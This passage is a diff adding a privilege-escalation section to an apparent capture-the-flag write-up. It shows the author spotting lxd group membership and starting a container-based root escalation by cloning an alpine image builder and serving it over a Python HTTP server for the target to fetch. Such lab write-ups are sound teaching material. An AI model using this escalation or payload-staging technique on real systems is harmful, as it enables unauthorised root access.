@@ -177,3 +177,24 @@ $ ssh john@target.thm -i secretKey
 ```
 
 I have a shell. I'm in!
+
+## Privilege Escalation
+
+I ran my [usual list of commands](../../README.md#linux-privilege-escalation). Running groups did yield some interesting results:
+
+```bash
+$ groups
+john adm cdrom sudo dip plugdev lxd
+```
+
+The user john is a member of the sudo group and if I had his password I could juse run sudo su and this would be all over. I don't know the password so I examine the other groups. The lxd group is interesting. I wasn't familiar with it but lxd is very similar to docker.
+
+I found out that I can run a lxc (which is a container) that will have escalated privileges and allow me to mount the hard drive of my machine. In other words, I can be the root user and mount my drive so that I have a root user on my drive.
+
+First things first, I need to grab a lxc container on my attack machine so that I can download it on my target machine. I run the following commands to download the lxc container and start a python http server so that my target machine can download it. Here are the commands I ran on my attack machine:
+
+```bash
+$ git clone https://github.com/saghul/lxd-alpine-builder.git
+$ cd lxd-alpine-builder
+$ python3 -m http.server
+```
